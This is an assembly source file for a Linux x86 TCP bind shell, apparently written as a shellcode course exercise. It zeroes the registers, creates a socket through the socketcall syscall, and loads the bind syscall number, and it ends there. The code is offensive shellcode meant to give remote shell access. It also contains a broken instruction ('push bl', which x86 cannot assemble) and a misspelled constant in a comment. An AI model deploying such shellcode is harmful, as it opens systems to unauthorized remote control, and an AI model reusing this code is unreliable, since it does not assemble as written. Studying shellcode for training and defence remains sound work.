;Program: Tcp_bind_shell.nasm
;Author : Bhanu Teja
;SLAE-1426

global _start

section .text
_start

;
;setting all the registers to 0
;

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;
;Creating a socket: socket(AF_INET, SOCK_STREAM, IP_PROTO_IP)
;socketcall syscall number is 102; Hex equivalent of 102 is 0x66
;

mov al, 0x66 	; syscall 102
mov bl, 0x1  	; #define SYS_SOCKET 1, First Arg to socketcall

;
; we need to push AF_INET, SOCK_STREAM, IP_PROTO as a single argument. This can be done by pushing them onto stack in the reverse order
;

push ecx     	; ecx value is zero and is pushed onto the stack as value for IP_PORTO_IP
push bl	     	; ebx value is 1 and is pushed onto stack as value for SOCK_STREAM
push 0x2     	; AF_INET value is 2 and is pushed on to the stack
mov ecx, esp 	; esp is pushed into ecx and now points to arguments
int 0x80     	; execute

mov edi, eax 	; sockfd is now moved into edi
mov eax, 0x169 	; bind syscall is 361 | Hex equivalent is 0x169

